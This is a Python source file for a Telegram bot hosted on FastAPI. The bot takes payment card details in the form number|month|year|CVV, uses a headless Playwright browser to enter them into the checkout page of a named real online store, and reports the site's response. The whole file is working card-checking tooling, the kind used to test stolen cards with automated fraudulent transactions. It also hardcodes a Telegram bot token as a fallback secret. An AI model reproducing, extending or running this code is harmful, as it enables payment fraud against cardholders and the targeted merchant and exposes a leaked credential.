import os
import asyncio
from fastapi import FastAPI
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters
from playwright.async_api import async_playwright

TOKEN = os.getenv("BOT_TOKEN", "7977593128:AAHzwfhgfKxc-FOZv04zoMcmeBBNoJG-f7A")
app = FastAPI()

async def testar_cartao(numero, mes, ano, cvv):
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page()
        try:
            await page.goto("https://www.guariguari.com/carrinho/pagamento", timeout=60000)
            await page.wait_for_selector('input[name="cardNumber"]', timeout=10000)

            await page.fill('input[name="cardNumber"]', numero)
            await page.fill('input[name="cardExpiry"]', f"{mes}/{ano}")
            await page.fill('input[name="cardCVC"]', cvv)

            await page.click('button[type="submit"]')
            await asyncio.sleep(5)

            mensagem = await page.evaluate("""
                () => {
                    const el = document.querySelector(".error, .message, .notification");
                    return el ? el.innerText : "Sem mensagem visível.";
                }
            """)
            await browser.close()
            return mensagem
        except Exception as e:
            await browser.close()
            return f"Erro ao testar: {str(e)}"

async def testar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        texto = update.message.text.strip()
        partes = texto.split("|")
        if len(partes) != 4:
            await update.message.reply_text("Formato inválido. Use: `numero|mes|ano|cvv`", parse_mode="Markdown")
            return

        numero, mes, ano, cvv = partes
        await update.message.reply_text("⏳ Testando o cartão...")
        resultado = await testar_cartao(numero, mes, ano, cvv)

        resposta = f"💳 <b>{numero}|{mes}|{ano}|{cvv}</b>\nResposta: <code>{resultado}</code>"
        await update.message.reply_text(resposta, parse_mode="HTML")
    except Exception as e:
        await update.message.reply_text(f"Erro: {str(e)}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Envie um cartão no formato:\n`numero|mes|ano|cvv`", parse_mode="Markdown")

async def run_bot():
    app_bot = ApplicationBuilder().token(TOKEN).build()
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, testar))
    await app_bot.run_polling()

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_bot())

@app.get("/")
def read_root():
    return {"status": "Bot ativo no Render"}